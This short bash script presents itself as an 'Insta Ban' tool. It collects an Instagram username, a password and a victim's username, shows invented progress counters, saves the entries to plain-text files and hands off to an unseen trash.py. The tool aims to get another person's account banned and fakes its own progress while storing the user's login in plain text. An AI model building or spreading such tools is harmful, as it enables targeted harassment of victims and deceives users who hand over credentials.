
clear
for (( i=1; i<=100; i++ ));
do
echo -ne "Launching...$i\r"
sleep 0.01
done
sleep 1
clear
figlet Insta Ban
echo This Tool Created By SHIBILGAMER
echo
echo "Enter Currect Information else Not Work Ban Tool"
echo
echo "Enter Fake Instagram Username:"
read user
echo "Enter Password:"
read pass
echo "Enter Victim Username"
read vname
for (( j=1; j<=100; j++ )); do
echo -ne "searching username...$j%\r"
sleep 0.05
done
sleep 1
echo -e username searching succefull ✓
echo username:$vname

echo "$user" > "u.txt"
echo "$pass" > "p.txt"
echo "$vname" > "v.txt"
sleep 1
python trash.py
